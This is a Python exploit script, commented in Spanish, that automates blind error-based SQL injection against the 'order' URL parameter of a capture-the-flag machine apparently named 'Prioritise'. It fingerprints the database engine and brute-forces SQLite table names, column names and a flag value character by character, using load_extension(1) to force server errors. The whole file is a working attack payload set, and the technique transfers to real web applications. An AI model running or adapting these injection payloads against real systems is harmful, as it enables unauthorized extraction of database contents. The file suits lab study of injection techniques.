#!/usr/bin/python3
from pwn import *
from colorama import init, Fore, Back, Style
import requests, string, signal, sys, time, argparse

def handler(sig, frame):

    print(Fore.YELLOW + "\n[!] Proceso interrupido...." + Style.RESET_ALL)
    sys.exit(1)

signal.signal(signal.SIGINT, handler)

def database_engine(ip):

    main_url = f"http://{ip}/?order="
    db_engines = ["SELECT banner FROM v$version", "SELECT version FROM v$instance", "SELECT @@version", "SELECT version()", "SELECT sqlite_version()"]
    engines = ["Oracle", "Microsoft", "PostgreSQL", "MySQL", "Sqlite"]
    p1 = log.progress("Obteniendo motor de Base de Datos.")
    p1.status("Iniciando ataque de fuerza bruta.")
    time.sleep(2)
    p2 = log.progress("Engine")

    for engine in engines:
        for payload in db_engines:

            payload_two = f"(CASE WHEN (({payload})>1) THEN title ELSE load_extension(1) END)"
            p1.status(Fore.CYAN + payload_two + Style.RESET_ALL)
            r = requests.get(main_url + payload_two)

            if r.status_code == 200:

                p2.status(Fore.GREEN + engine + Style.RESET_ALL)
                break

def extract_table_name(ip):

    data = ""
    main_url = f"http://{ip}/?order="
    characters = string.ascii_letters + string.digits
    p1 = log.progress("Fuerza Bruta")
    p1.status("Iniciando ataque de fuerza bruta")
    time.sleep(2)
    p2 = log.progress("Table Name")

    for offset in range(0, 2):
        for position in range(1, 6):
            for character in characters:

                payload = f"(SELECT CASE WHEN ((SELECT SUBSTR(tbl_name,{position},1) FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET {offset})='{character}') THEN load_extension(1) ELSE 1 END)"
                p1.status(Fore.CYAN + payload + Style.RESET_ALL)
                r = requests.get(main_url + payload)

                if 500 == r.status_code:

                    data += character
                    p2.status(Fore.GREEN + data + Style.RESET_ALL)
                    break

        data += ","

def extract_column_name(ip):

    data = ""
    main_url = f"http://{ip}/?order="
    characters = string.ascii_letters + string.digits
    p3 = log.progress("Fuerza Bruta")
    p3.status("Iniciando ataque de fuerza bruta")
    time.sleep(2)
    p4 = log.progress("Column Name")

    for offset in range(0, 4):
        for position in range(1, 6):
            for character in characters:

                payload = f"(SELECT+CASE+WHEN+((SELECT+SUBSTR(name,{position},1)+FROM+PRAGMA_TABLE_INFO('todos')+LIMIT+1+OFFSET+{offset})='{character}')+THEN+load_extension(1)+ELSE+1+END)"
                p3.status(Fore.CYAN + payload + Style.RESET_ALL)
                r = requests.get(main_url + payload)

                if 500 == r.status_code:

                    data += character
                    p4.status(Fore.GREEN + data + Style.RESET_ALL)
                    break

        data += ","

def extract_Data(ip):

    data = ""
    main_url = f"http://{ip}/?order="
    characters = string.ascii_letters + string.digits + string.punctuation
    p5 = log.progress("Fuerza Bruta")
    p5.status("Iniciando ataque de fuerza bruta")
    time.sleep(2)
    p6 = log.progress("Exposed Data")

    for position in range(1, 39):
        for character in characters:

            payload = f"(SELECT+CASE+WHEN+((SELECT+SUBSTR(flag,{position},1)+FROM+flag)='{character}')+THEN+load_extension(1)+ELSE+1+END)"
            p5.status(Fore.CYAN + payload + Style.RESET_ALL)
            r = requests.get(main_url + payload)

            if 500 == r.status_code:

                data += character
                p6.status(Fore.GREEN + data + Style.RESET_ALL)
                break

def main():

    parser = argparse.ArgumentParser(description="Script para automatizar ataque SQLi de maquina Prioritise.")
    parser.add_argument("ip", nargs="?", help="indique la direccion IP.")
    args = parser.parse_args()

    if args.ip:

        database_engine(args.ip)
        extract_table_name(args.ip)
        extract_column_name(args.ip)
        extract_Data(args.ip)

    else:

        parser.print_help()
        sys.exit(1)


if __name__=="__main__":

    main()
